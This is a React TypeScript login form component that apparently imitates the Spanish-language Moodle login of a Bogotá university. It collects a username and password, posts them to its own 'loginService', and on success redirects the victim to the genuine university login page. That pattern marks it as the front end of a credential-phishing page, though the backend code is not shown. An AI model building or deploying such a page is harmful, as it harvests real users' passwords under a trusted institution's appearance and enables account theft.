import React, { useState } from "react";
import { loginService } from "../services/loginService"; 
import type { LoginData } from "../types/AuthTypes";
import axios from "axios";

const LoginForm: React.FC = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const data: LoginData = {
      usuario: email,
      password: password,
    };

    try {
      const response = await loginService(data);
      console.log("Respuesta del servidor:", response);

      // ✅ Redirigir si el backend responde 200
      if (response.status === 200) {
        window.location.href = "https://virtual.usbbog.edu.co/login/index.php";
      }
    } catch (error) {
      // 👇 Tipado seguro usando axios error
      if (axios.isAxiosError(error)) {
        console.error("Error de Axios:", error.response?.data || error.message);
      } else {
        console.error("Error desconocido:", error);
      }
      alert("Hubo un problema al enviar los datos.");
    }
  };

  return (
    <form onSubmit={handleSubmit} className="flex flex-col gap-5">
      {/* Usuario o correo */}
      <input
        type="text"
        placeholder="Nombre de usuario o correo electrónico"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        className="w-[400px] bg-white text-[#333] placeholder-gray-500 border border-gray-300 rounded-sm px-6 py-[12px] focus:outline-none focus:ring-2 focus:ring-[#e18938] text-[17px] font-[Roboto,Arial,Helvetica,sans-serif]"
      />

      {/* Contraseña */}
      <input
        type="password"
        placeholder="Contraseña"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        className="w-[400px] bg-white text-[#333] placeholder-gray-500 border border-gray-300 rounded-sm px-6 py-[12px] focus:outline-none focus:ring-2 focus:ring-[#e18938] text-[17px] font-[Roboto,Arial,Helvetica,sans-serif]"
      />

      {/* Botón acceder */}
      <button
        type="submit"
        className="w-[180px] bg-[#ef8935] hover:bg-[#d87628] text-white font-semibold py-[12px] rounded-sm transition text-[15px]"
      >
        ACCEDER
      </button>
    </form>
  );
};

export default LoginForm;
